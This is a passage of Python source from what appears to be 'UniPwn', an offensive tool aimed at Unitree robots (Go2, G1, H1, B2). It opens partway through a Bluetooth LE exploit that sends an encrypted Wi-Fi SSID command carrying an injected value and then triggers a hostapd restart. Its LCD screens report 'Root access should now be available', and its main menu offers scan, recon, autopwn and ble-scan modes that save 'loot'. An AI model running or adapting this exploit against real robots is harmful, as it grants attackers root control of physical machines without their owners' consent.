                inject_enc = _ble_encrypt(f"set_wifi_ssid {injection}")
                await client.write_gatt_char(BLE_WRITE_CHAR, inject_enc)
                await asyncio.sleep(1)

                # Step 5: Set password (can also inject here)
                pwd_enc = _ble_encrypt("set_wifi_pwd 12345678")
                await client.write_gatt_char(BLE_WRITE_CHAR, pwd_enc)
                await asyncio.sleep(0.5)

                # Step 6: Trigger — change country code to restart hostapd
                _step("Triggering exploit...")
                trigger_enc = _ble_encrypt("set_country US")
                await client.write_gatt_char(BLE_WRITE_CHAR, trigger_enc)
                await asyncio.sleep(3)

                # Check for response
                _step("Checking result...")
                await asyncio.sleep(2)

                result["success"] = True
                result["error"] = ""
                _step("Exploit sent!")

        except Exception as e:
            result["error"] = str(e)[:40]
            _step(f"Error: {result['error']}")

    try:
        asyncio.run(_exploit())
    except Exception as e:
        result["error"] = str(e)[:40]

    return result


# ---------------------------------------------------------------------------
# BLE LCD Drawing
# ---------------------------------------------------------------------------

def draw_ble_scan(lcd, devices, cursor, scroll, status):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#000033")
    d.text((2, 1), "BLE SCAN", font=FONT_BIG, fill="#0088FF")
    d.text((65, 2), f"Found:{len(devices)}", font=FONT_SM,
           fill="#00FF00" if devices else "#555")

    if not BLE_OK:
        d.text((10, 30), "bleak not installed", font=FONT, fill="#FF4444")
        d.text((10, 45), "pip3 install bleak", font=FONT_SM, fill="#888")
    elif not devices:
        d.text((10, 30), status[:22], font=FONT, fill="#888")
        d.text((10, 48), "OK to scan for", font=FONT_SM, fill="#666")
        d.text((10, 58), "Go2/G1/H1/B2 robots", font=FONT_SM, fill="#666")
        d.text((10, 72), "Needs BT adapter", font=FONT_SM, fill="#555")
    else:
        visible = devices[scroll:scroll + 7]
        for i, dev in enumerate(visible):
            y = 15 + i * 14
            idx = scroll + i
            prefix = ">" if idx == cursor else " "
            name = dev["name"][:11]
            color = "#0088FF" if idx == cursor else "#AAAAAA"
            d.text((2, y), f"{prefix}{name}", font=FONT, fill=color)
            d.text((82, y), f"{dev['rssi']}dB", font=FONT_SM, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Scan/Sel K3:Back", font=FONT_SM, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def draw_ble_pwn(lcd, target, step, payload_idx, result):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#330000")
    d.text((2, 1), "BLE PWN", font=FONT_BIG, fill="#FF0044")
    d.text((60, 2), "UniPwn", font=FONT_SM, fill="#FF8800")

    y = 16
    if target:
        d.text((2, y), f"{target['name'][:16]}", font=FONT, fill="#0088FF")
        y += 11
        d.text((2, y), f"{target['mac']}", font=FONT_SM, fill="#888")
        y += 12

    if step == "select":
        d.text((2, y), "Select payload:", font=FONT, fill="#FFAA00")
        y += 12
        for i, (name, _) in enumerate(BLE_PAYLOADS):
            if y > 108:
                break
            prefix = ">" if i == payload_idx else " "
            color = "#FF0044" if i == payload_idx else "#888"
            d.text((2, y), f"{prefix}{name[:20]}", font=FONT_SM, fill=color)
            y += 10

        d.rectangle((0, 116, 127, 127), fill="#330000")
        d.text((2, 117), "OK:Exploit K3:Cancel", font=FONT_SM, fill="#FF0044")

    elif step == "running":
        d.text((2, y), "Exploiting...", font=FONT, fill="#FF0044")
        y += 14
        if result and result.get("sn"):
            d.text((2, y), f"SN: {result['sn'][:18]}", font=FONT_SM, fill="#00FF00")
            y += 10

    elif step == "done":
        if result and result.get("success"):
            d.text((2, y), "EXPLOIT SENT!", font=FONT, fill="#00FF00")
            y += 12
            if result.get("sn"):
                d.text((2, y), f"SN: {result['sn'][:18]}", font=FONT_SM, fill="#00FF00")
                y += 10
            d.text((2, y), "Root access should", font=FONT_SM, fill="#CCC")
            y += 10
            d.text((2, y), "now be available", font=FONT_SM, fill="#CCC")
        else:
            err = result.get("error", "Unknown") if result else "No result"
            d.text((2, y), "EXPLOIT FAILED", font=FONT, fill="#FF4444")
            y += 12
            d.text((2, y), err[:22], font=FONT_SM, fill="#FF8888")

        d.rectangle((0, 116, 127, 127), fill="#111")
        d.text((2, 117), "K2:Save OK:Back K3:X", font=FONT_SM, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    choices=[{"value":x["name"],"label":x["name"]} for x in list_interfaces("wifi")]
    if not choices: print("No Wi-Fi interface found",flush=True); return 1
    iface=str(request_input("Select Wi-Fi interface",input_type="select",choices=choices))
    mode=sys.argv[1] if len(sys.argv)>1 else "recon"
    if mode=="scan":
        rows=scan_unitree_wifi(iface); path=save_loot(rows,"wifi_scan"); print(f"Found {len(rows)} networks; saved {path}",flush=True); return 0
    if mode=="recon":
        rows=discover_services(callback=lambda m: print(m,flush=True)); path=save_loot(rows,"recon"); print(f"Saved {path}",flush=True); return 0
    if mode=="autopwn":
        report=auto_pwn(None,iface); print(json.dumps(report,default=str),flush=True); return 0
    if mode=="ble-scan":
        rows=ble_scan_unitree(timeout=min(60,int(sys.argv[2]) if len(sys.argv)>2 else 8)); path=save_loot(rows,"ble_scan"); print(f"Found {len(rows)} devices; saved {path}",flush=True); return 0
    print("Mode must be scan, recon, autopwn, or ble-scan",flush=True); return 2

if __name__ == "__main__": raise SystemExit(main())
